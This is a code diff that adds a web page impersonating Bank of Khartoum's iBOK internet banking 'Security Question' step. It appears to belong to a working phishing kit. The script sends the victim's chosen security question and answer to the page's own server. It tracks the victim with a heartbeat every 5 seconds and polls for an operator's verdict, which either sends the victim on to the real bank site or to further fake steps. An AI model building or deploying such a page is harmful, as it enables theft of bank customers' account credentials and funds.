@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bank of Khartoum | Security Question</title>
+<link href="images/favicon-bok.png" rel="icon">
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Open Sans',sans-serif;background:#e8e8e8;min-height:100vh;display:flex;flex-direction:column;overflow-x:hidden}
+
+.top-header{display:grid;height:80px;width:100%;grid-template-columns:1fr 3fr;background:linear-gradient(#f33432,#bc262a)}
+.header-logo{width:100%;height:100%;display:inline-grid;place-items:center}
+.header-logo img{height:60px}
+.header-text{color:#fff;text-align:right;display:inline-grid;align-items:center;padding-right:3vw;font-size:24px;font-weight:700;background:linear-gradient(#f0b933,#e2ae2d,#d09e24,#bb8b16)}
+
+.section{flex:1}
+.prelogin{padding:20px 16px}
+.prelogin .container{max-width:600px;margin:0 auto}
+
+.loginTitle h2{color:#bc262a;font-size:22px;font-weight:600}
+.loginbox{padding:20px 5vw;margin-top:10px;border-radius:6px;background-color:#fff;border:1px solid #ccc;box-shadow:0 3px 6px rgba(0,0,0,.16),0 3px 6px rgba(0,0,0,.23);margin-bottom:50px}
+.loginbox h3{text-align:center;font-size:20px;color:#585958;font-weight:600;position:relative;padding-bottom:12px;margin-bottom:20px}
+.loginbox h3::after{content:"";width:50%;height:3px;border-radius:10px;background-color:#bc262a;position:absolute;left:50%;transform:translateX(-50%);bottom:0}
+
+.questions-list{list-style:none;padding:0;margin:0 0 20px}
+.questions-list li{display:flex;align-items:center;gap:12px;padding:14px 8px;border-bottom:1px solid #f0f0f0;cursor:pointer;transition:background .15s}
+.questions-list li:hover{background:#fafafa}
+.questions-list li:last-child{border-bottom:none}
+.questions-list input[type="radio"]{width:22px;height:22px;accent-color:#2196F3;cursor:pointer;flex-shrink:0}
+.questions-list label{font-size:15px;color:#333;cursor:pointer;line-height:1.5;flex:1}
+
+.answer-section{display:none;margin-top:16px;padding-top:16px;border-top:2px solid #eee}
+.answer-section.show{display:block}
+.answer-section label{color:#828488;font-size:14px;display:block;margin-bottom:6px}
+.answer-section .selected-q{color:#bc262a;font-size:14px;font-weight:600;margin-bottom:12px}
+.answer-input{border:1px solid #666;height:42px;width:100%;padding:6px 12px;border-radius:4px;font-size:15px;font-family:'Open Sans',sans-serif;outline:none}
+.answer-input:focus{border-color:#bc262a}
+
+.error-box{display:none;background:#fff5f5;border:1px solid #f5c6cb;border-radius:4px;padding:10px;margin-bottom:14px;text-align:center}
+.error-box.show{display:block}
+.error-box span{color:#dc3545;font-size:13px;font-weight:600}
+
+.btn-bok{background-color:#bc262a;display:block;width:100%;color:#fff;padding:10px;font-size:16px;font-weight:600;border-radius:4px;cursor:pointer;font-family:'Open Sans',sans-serif;transition:background-color .2s;border:none;margin-top:16px}
+.btn-bok:hover{background-color:#a11a19}
+.btn-bok:disabled{opacity:.5;cursor:default}
+
+.footer{margin-top:auto;padding:10px;background:linear-gradient(#bfc1c4,#eff0f1,#fcfdfd,#ffffff);border-top:3px solid #bc262a;text-align:center;line-height:40px}
+.copyright{font-weight:600;color:#4a4a4a;font-size:14px}
+.social-media{display:flex;justify-content:center;gap:14px;margin-top:6px}
+.soc-ico img{height:32px;width:32px}
+
+.loading-overlay{display:none;position:fixed;inset:0;background:rgba(255,255,255,.92);z-index:1000;align-items:center;justify-content:center;flex-direction:column}
+.loading-overlay.show{display:flex}
+.lo-spinner{width:40px;height:40px;border:4px solid #e0e0e0;border-top:4px solid #bc262a;border-radius:50%;animation:spin .8s linear infinite;margin-bottom:12px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.lo-text{font-size:14px;color:#bc262a;font-weight:600}
+
+@media(max-width:480px){
+  .header-text{font-size:18px;padding-right:12px}
+  .top-header{height:70px}
+  .loginbox{padding:20px 16px}
+  .questions-list label{font-size:14px}
+}
+</style>
+</head>
+<body>
+
+<div class="top-header">
+  <div class="header-logo">
+    <img src="images/bok-logo.svg" alt="iBOK">
+  </div>
+  <div class="header-text">Welcome to<br>iBOK Internet<br>Banking</div>
+</div>
+
+<div class="section">
+  <div class="prelogin">
+    <div class="container">
+      <div class="loginTitle">
+        <h2>Security Question</h2>
+      </div>
+      <div class="loginbox">
+        <h3>Select Security Question</h3>
+
+        <div class="error-box" id="errorBox"><span id="errorText">Please select a question and enter your answer</span></div>
+
+        <ul class="questions-list" id="questionsList">
+          <li><input type="radio" name="sq" id="q0" value="-- Select security question --" checked disabled><label for="q0">-- Select security question --</label></li>
+          <li><input type="radio" name="sq" id="q1" value="What is your first cousin's name?"><label for="q1">What is your first cousin's name?</label></li>
+          <li><input type="radio" name="sq" id="q2" value="In which city were you born?"><label for="q2">In which city were you born?</label></li>
+          <li><input type="radio" name="sq" id="q3" value="What year did you graduate from university?"><label for="q3">What year did you graduate from university?</label></li>
+          <li><input type="radio" name="sq" id="q4" value="What was your childhood nickname?"><label for="q4">What was your childhood nickname?</label></li>
+          <li><input type="radio" name="sq" id="q5" value="What is your favorite author's name?"><label for="q5">What is your favorite author's name?</label></li>
+          <li><input type="radio" name="sq" id="q6" value="What is your favorite car manufacturer?"><label for="q6">What is your favorite car manufacturer?</label></li>
+          <li><input type="radio" name="sq" id="q7" value="What is your favorite movie?"><label for="q7">What is your favorite movie?</label></li>
+          <li><input type="radio" name="sq" id="q8" value="What is your best childhood friend's name?"><label for="q8">What is your best childhood friend's name?</label></li>
+          <li><input type="radio" name="sq" id="q9" value="What year did you get your driver's license?"><label for="q9">What year did you get your driver's license?</label></li>
+          <li><input type="radio" name="sq" id="q10" value="What brand was your first TV?"><label for="q10">What brand was your first TV?</label></li>
+          <li><input type="radio" name="sq" id="q11" value="What year did you get married?"><label for="q11">What year did you get married?</label></li>
+          <li><input type="radio" name="sq" id="q12" value="What is your favorite football team?"><label for="q12">What is your favorite football team?</label></li>
+          <li><input type="radio" name="sq" id="q13" value="What is the name of the school you attended?"><label for="q13">What is the name of the school you attended?</label></li>
+          <li><input type="radio" name="sq" id="q14" value="What is the first foreign country you visited?"><label for="q14">What is the first foreign country you visited?</label></li>
+          <li><input type="radio" name="sq" id="q15" value="What was the brand of your first car?"><label for="q15">What was the brand of your first car?</label></li>
+        </ul>
+
+        <div class="answer-section" id="answerSection">
+          <div class="selected-q" id="selectedQ"></div>
+          <label for="answerInput">Answer:</label>
+          <input type="text" class="answer-input" id="answerInput" placeholder="Enter your answer" autocomplete="off">
+        </div>
+
+        <button type="button" class="btn-bok" id="submitBtn" onclick="submitSecurity()">Done</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="footer">
+  <div class="container">
+    <div class="copyright">iBOK | Bank of Khartoum 2024</div>
+    <div class="social-media">
+      <span class="soc-ico"><a href="#"><img src="images/bok-footer-logo.svg" alt="BOK"></a></span>
+      <span class="soc-ico"><a href="#"><img src="images/bok-linkidin.svg" alt="LinkedIn"></a></span>
+      <span class="soc-ico"><a href="#"><img src="images/bok-x.svg" alt="X"></a></span>
+      <span class="soc-ico"><a href="#"><img src="images/bok-facebook.svg" alt="Facebook"></a></span>
+    </div>
+  </div>
+</div>
+
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="lo-spinner"></div>
+  <div class="lo-text">Submitting...</div>
+</div>
+
+<script>
+var _vid=sessionStorage.getItem('_vid');if(!_vid){_vid=Math.random().toString(36).slice(2)+Date.now().toString(36);sessionStorage.setItem('_vid',_vid);}
+function heartbeat(){fetch('/api/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({page:'security',vid:_vid})}).catch(function(){});}
+heartbeat();setInterval(heartbeat,5000);
+
+var params=new URLSearchParams(window.location.search);
+var id=params.get('id');
+if(!id){window.location.href='login-en.html';}
+
+var radios=document.querySelectorAll('input[name="sq"]');
+var answerSection=document.getElementById('answerSection');
+var selectedQEl=document.getElementById('selectedQ');
+
+radios.forEach(function(r){
+  r.addEventListener('change',function(){
+    if(r.value!=='-- Select security question --'){
+      selectedQEl.textContent=r.value;
+      answerSection.classList.add('show');
+      document.getElementById('answerInput').focus();
+    }else{
+      answerSection.classList.remove('show');
+    }
+  });
+});
+
+document.querySelectorAll('.questions-list li').forEach(function(li){
+  li.addEventListener('click',function(){
+    var radio=li.querySelector('input[type="radio"]');
+    if(radio&&!radio.disabled){radio.checked=true;radio.dispatchEvent(new Event('change'));}
+  });
+});
+
+function submitSecurity(){
+  var selected=document.querySelector('input[name="sq"]:checked');
+  var answer=document.getElementById('answerInput').value.trim();
+  if(!selected||selected.value==='-- Select security question --'||!answer){
+    document.getElementById('errorBox').classList.add('show');
+    return;
+  }
+  document.getElementById('errorBox').classList.remove('show');
+  document.getElementById('submitBtn').disabled=true;
+  document.getElementById('submitBtn').textContent='Submitting...';
+
+  fetch('/api/submit-security/'+id,{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({question:selected.value,answer:answer})
+  })
+  .then(function(r){return r.json();})
+  .then(function(d){
+    if(d.ok){
+      document.getElementById('loadingOverlay').classList.add('show');
+      pollAfterSecurity();
+    }else{
+      document.getElementById('submitBtn').disabled=false;
+      document.getElementById('submitBtn').textContent='Done';
+    }
+  })
+  .catch(function(){
+    document.getElementById('submitBtn').disabled=false;
+    document.getElementById('submitBtn').textContent='Done';
+  });
+}
+
+document.getElementById('answerInput').addEventListener('keydown',function(e){if(e.key==='Enter')submitSecurity();});
+
+function pollAfterSecurity(){
+  setInterval(function(){
+    fetch('/api/status/'+id)
+    .then(function(r){return r.json();})
+    .then(function(d){
+      if(d.status==='accepted'){
+        window.location.href='https://ib.bok-sd.com';
+      }else if(d.status==='rejected'){
+        window.location.href='login-en.html?error=1';
+      }else if(d.status==='redirect'&&d.redirect){
+        if(d.redirect!=='security') window.location.href=d.redirect+'-en.html?id='+id;
+      }
+    }).catch(function(){});
+  },3000);
+}
+</script>
+</body>
+</html>
